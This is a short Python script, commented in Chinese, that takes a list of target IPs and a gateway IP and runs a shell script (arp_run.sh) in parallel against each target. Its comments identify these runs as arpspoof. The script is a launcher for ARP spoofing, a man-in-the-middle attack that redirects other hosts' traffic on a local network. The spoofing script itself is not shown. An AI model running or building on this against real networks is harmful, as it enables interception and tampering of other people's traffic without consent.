import subprocess
import argparse

def getArgsList():
    # 依次传入多个 target IP，最后一个是网关 IP
    parser = argparse.ArgumentParser(description="传参")
    parser.add_argument('--list', type=str, nargs="+", help='runHostIP', required=True)
    parser.add_argument('--interface', type=str, help='interfaceName', default='eth0')
    parser.add_argument('--name', type=str, help='shFileName', required=False)
    return parser.parse_args()

# 获取命令行参数
result = getArgsList()

targetIps = result.list[:-1]
gatewayIp = result.list[-1]
networkCard = result.interface or 'eth0'
shFileName = result.name or 'arp_run.sh'

processes = []
for targetIP in targetIps:
    # 以异步方式运行 arpspoof
    proc = subprocess.Popen(['bash', shFileName, targetIP, gatewayIp, networkCard])
    processes.append(proc)

for proc in processes:
    # 等待所有的 arpspoof 进程完成
    proc.wait()